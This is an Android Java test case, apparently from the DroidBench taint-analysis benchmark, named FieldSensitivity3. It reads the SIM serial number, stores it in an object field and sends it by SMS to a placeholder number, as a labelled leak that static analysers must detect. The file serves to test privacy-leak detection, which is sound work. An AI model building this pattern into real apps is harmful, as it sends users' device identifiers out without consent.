package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
/**
 * @testcase_name FieldSensitivity3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description An object has two fields, the one that gets tainted is sent to a sink.
 * @dataflow source -> d1.secret -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to distinguish between different fields of an object.
 */
public class FieldSensitivity3 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_field_sensitivity3);
        
        Datacontainer d1 = new Datacontainer();
		d1.setDescription("abc");
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		d1.setSecret(telephonyManager.getSimSerialNumber()); //source
		
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, d1.getSecret(), null, null); //sink, leak
    }    
}
